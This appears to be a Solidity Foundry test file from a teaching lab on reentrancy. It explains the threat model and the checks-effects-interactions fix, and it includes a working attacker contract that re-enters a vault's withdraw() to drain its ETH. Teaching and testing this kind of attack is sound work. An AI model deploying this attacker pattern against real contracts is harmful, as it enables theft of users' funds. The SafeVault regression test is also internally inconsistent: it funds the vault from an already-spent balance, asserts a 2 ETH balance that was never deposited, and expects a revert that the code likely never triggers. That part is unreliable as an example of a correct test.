// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {SafeVault} from "../src/SafeVault.sol";

/// @title Reentrancy.t.sol
/// @notice Lab 01 — Exploit + regression test for reentrancy.
///
/// Lab: Reentrancy (checks-effects-interactions)
///
/// Threat model:
///   An attacker contract receives ETH via `receive()` and re-enters
///   `vault.withdraw()` before the vault has decremented the attacker's
///   balance. The vault sends ETH twice but only debits once.
///
/// Violated invariant:
///   "balances[msg.sender] >= amount held" — broken because accounting
///   is updated AFTER the external call.
///
/// Reproduction:
///   1. Deploy VulnerableVault.
///   2. Victim deposits 1 ETH.
///   3. Attacker seeds 1 ETH, then calls attack(1 ether).
///   4. Inside withdraw, the vault calls attacker.receive() with 1 ETH.
///   5. Attacker.receive() calls vault.withdraw(1 ether) again — balance
///      check still passes because accounting hasn't been updated.
///   6. Vault sends another 1 ETH. Attacker drained 2 ETH from a 2 ETH
///      vault (1 ETH victim + 1 ETH attacker own).
///
/// Remediation:
///   Apply checks-effects-interactions: decrement balance before the
///   external call (see SafeVault).
///
/// Regression test:
///   The same exploit against SafeVault must revert (insufficient balance).
interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentries;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function seed() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        vault.withdraw(amount);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && reentries == 0) {
            reentries = 1;
            vault.withdraw(1 ether);
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableVault vulnerable;
    SafeVault safe;
    ReentrancyAttacker attacker;

    function setUp() public {
        vulnerable = new VulnerableVault();
        safe = new SafeVault();
        attacker = new ReentrancyAttacker(IVault(address(vulnerable)));

        vm.deal(address(this), 2 ether);
        vulnerable.deposit{value: 1 ether}();
        attacker.seed{value: 1 ether}();
    }

    /// @notice Exploit: drains 2 ETH from the vulnerable vault.
    function testVulnerableVaultCanBeReentered() public {
        attacker.attack(1 ether);

        assertEq(address(attacker).balance, 2 ether, "attacker did not drain twice");
        assertEq(address(vulnerable).balance, 0, "vault still has funds");
    }

    /// @notice Regression: SafeVault rejects re-entry.
    function testSafeVaultRejectsReentry() public {
        ReentrancyAttacker safeAttacker = new ReentrancyAttacker(IVault(address(safe)));
        safeAttacker.seed{value: 1 ether}();

        vm.expectRevert();
        safeAttacker.attack(1 ether);

        assertEq(address(safe).balance, 2 ether, "safe vault lost funds");
    }
}
